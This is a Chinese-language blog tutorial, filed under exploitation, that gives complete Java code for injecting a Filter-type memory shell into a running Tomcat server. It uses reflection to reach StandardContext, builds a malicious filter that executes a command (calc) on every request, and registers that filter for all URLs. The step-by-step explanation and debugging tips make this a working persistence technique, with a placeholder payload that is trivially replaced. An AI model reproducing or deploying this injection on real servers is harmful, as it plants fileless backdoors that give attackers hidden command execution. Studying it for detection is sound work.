---
title: 手写一个Tomcat Filter类型内存马
tags:
  - 内存马
  - tomcat
  - filter
categories:
  - - 漏洞利用
description: 本文编写了一个常见的Filter内存马
abbrlink: f0f0aa4f
date: 2025-04-14 10:33:52
---
```java
 try {
//            获取StandardContext对象
            System.out.println("获取StandardContext对象");
//            Field request = req.getClass().getDeclaredField("request");
//            request.setAccessible(true);
//            Request request1 = (Request) request.get(request);
//            StandardContext context1 = (StandardContext) request1.getContext();
            ServletContext servletContext1 = req.getSession().getServletContext();
            Field context = null;
            context = ApplicationContextFacade.class.getDeclaredField("context");
            context.setAccessible(true);
            Field context2 = ApplicationContext.class.getDeclaredField("context");
            context2.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext1);
            StandardContext context1 = (StandardContext) context2.get(applicationContext);

//            将EvilFilter添加到FilterDef
            System.out.println("将EvilFilter添加到FilterDef");
            FilterDef filterDef = new FilterDef();
             Filter evilFilter = new Filter(){
                @Override
                public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
                    Runtime.getRuntime().exec("calc");
                    chain.doFilter(request, response);
                }

                 @Override
                 public void init(FilterConfig filterConfig) throws ServletException {
//                     init方法必须写，不然会报错
                 }

                 @Override
                 public void destroy() {
//                    destory方法必须写，不然会报错

                 }
             };
            filterDef.setFilter(evilFilter);
            String filterName = "evil";
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(evilFilter.getClass().getName());
            //将FilterDef添加到FilterDefs
            System.out.println("将FilterDef添加到FilterDefs");
            context1.addFilterDef(filterDef);
//            获取filterConfig并添加到filterConfigs
            System.out.println("获取filterConfig并添加到filterConfigs");
            Constructor<ApplicationFilterConfig> declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            declaredConstructor.setAccessible(true);
//            System.out.println(1);
            ApplicationFilterConfig applicationFilterConfig = declaredConstructor.newInstance(context1, filterDef);
            Field filterConfigs = StandardContext.class.getDeclaredField("filterConfigs");
            filterConfigs.setAccessible(true);
//            System.out.println(2);
            Map map = (Map) filterConfigs.get(context1);
            map.put(filterName, applicationFilterConfig);
//            将filterMap添加到StandardContext
            System.out.println("将filterMap添加到StandardContext");

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/*");
            filterMap.setFilterName(filterName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            context1.addFilterMapBefore(filterMap);
            System.out.println("内存马注入成功");

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
```
要实现一个Filter类型的内存马，必要要完成以下的步骤

- 获取StandardContext对象
- 写一个恶意FIlter
- 将恶意Filter加入到FilterDef中
- 将FIlterDef加入到FilterDefs中
- 将FilterDefs封装到FilterConfig中
- 将FilterCOnfig封装到FilterConfigs中
- 添加FIlter Parttern

首先要获取Standard对象
利用IDEA的Evaluate工具我们可以知道req.getSession().getServletContext()的执行结果是一个ApplicationContextFacade对象，在其中有一个Context属性为APplicationContext类型的对象，这个APplicationContext类型的对象中有有一个属性context为StrandardContext类型的对象，也就是我们需要的。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/b4d18b39f0e89dee214586de0bf6155c.png)
所以我们利用两次反射就可以获取到该StandardContext对象
```java
ServletContext servletContext1 = req.getSession().getServletContext();
Field context = null;
context = ApplicationContextFacade.class.getDeclaredField("context");
context.setAccessible(true);
Field context2 = ApplicationContext.class.getDeclaredField("context");
context2.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext1);
StandardContext context1 = (StandardContext) context2.get(applicationContext);
```
还有另一种获取到StandardContext对象的方式，可以直接通过request对象获取

```java
Field request = req.getClass().getDeclaredField("request");
request.setAccessible(true);
Request request1 = (Request) request.get(request);
StandardContext context1 = (StandardContext) request1.getContext();
```
嗯，就这么多想说的，后面的看代码就好了，主要就是按照上面的步骤来注入就行了，这里注意恶意的Filter类必须显式的重写init与destory方法，否则你会发现怎么都注入不成功，当然这都是我踩过的坑，浪费了我很多时间。。。


